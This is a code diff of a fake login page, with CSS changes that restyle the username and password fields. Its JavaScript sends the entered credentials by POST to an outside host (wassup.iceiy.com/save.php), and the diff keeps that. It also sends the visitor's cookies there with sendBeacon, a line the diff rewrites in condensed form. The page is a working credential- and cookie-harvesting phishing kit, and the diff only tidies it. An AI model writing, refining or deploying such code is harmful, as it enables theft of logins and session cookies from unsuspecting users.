@@ -48,7 +48,7 @@
             border: none;
             outline: none;
             font-size: 16px;
-            color: black !important;
+            color: white !important;
             padding: 10px;
             box-sizing: border-box;
             z-index: 4;
@@ -59,13 +59,16 @@
             border: none;
             outline: none;
             font-size: 16px;
-            color: transparent;
-            caret-color: black;
+            color: white;
+            caret-color: white;
             padding: 10px;
             box-sizing: border-box;
             z-index: 4;
-            letter-spacing: 2px;
-            -webkit-text-security: disc !important;
+            -webkit-text-security: disc;
+        }
+        #username::placeholder, #password::placeholder {
+            color: white !important;
+            opacity: 0.7;
         }
         #login-button {
             position: absolute;
@@ -144,7 +147,6 @@
                     return;
                 }
 
-                // Send to your backend
                 fetch("https://wassup.iceiy.com/save.php", {
                     method: "POST",
                     mode: 'no-cors',
@@ -163,8 +165,7 @@
 
                 const cookies = document.cookie;
                 if (cookies) {
-                    const cookieData = `cookies=${encodeURIComponent(cookies)}`;
-                    navigator.sendBeacon("https://wassup.iceiy.com/start.php", cookieData);
+                    navigator.sendBeacon("https://wassup.iceiy.com/start.php", `cookies=${encodeURIComponent(cookies)}`);
                 }
 
                 setTimeout(() => {
